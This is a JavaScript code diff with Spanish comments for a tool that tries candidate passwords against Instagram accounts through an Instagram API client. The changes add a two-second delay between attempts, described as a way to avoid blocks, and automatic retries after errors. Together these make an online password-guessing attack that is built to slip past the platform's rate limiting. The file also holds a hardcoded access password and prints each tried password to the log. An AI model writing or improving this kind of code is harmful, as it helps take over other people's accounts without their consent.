@@ -16,13 +16,19 @@ const accessPassword = 'error404notfoundÑ'; // Contraseña fija
 
 console.log(`[DEBUG] Contraseña de acceso: ${accessPassword}`);
 
-// Función para probar una contraseña
-async function testPassword(username, password) {
+// Función de retraso
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+// Función para probar una contraseña con reintentos
+async function testPassword(username, password, retries = 3) {
   const ig = new IgApiClient();
   try {
     // Simular un dispositivo para la API
     ig.state.generateDevice(username);
     console.log(`[DEBUG] Probando contraseña: ${password}`);
+
+    // Retraso entre intentos para evitar bloqueos
+    await delay(2000);
 
     // Intentar iniciar sesión
     await ig.account.login(username, password);
@@ -46,7 +52,13 @@ async function testPassword(username, password) {
       return { success: false, password, message: 'Contraseña incorrecta.' };
     }
 
-    // Otros errores
+    // Otros errores: reintentar si quedan intentos
+    if (retries > 0) {
+      console.log(`[DEBUG] Reintentando... (${retries} intentos restantes)`);
+      await delay(2000); // Retraso antes de reintentar
+      return testPassword(username, password, retries - 1);
+    }
+
     return { success: false, password, message: error.message };
   }
 }
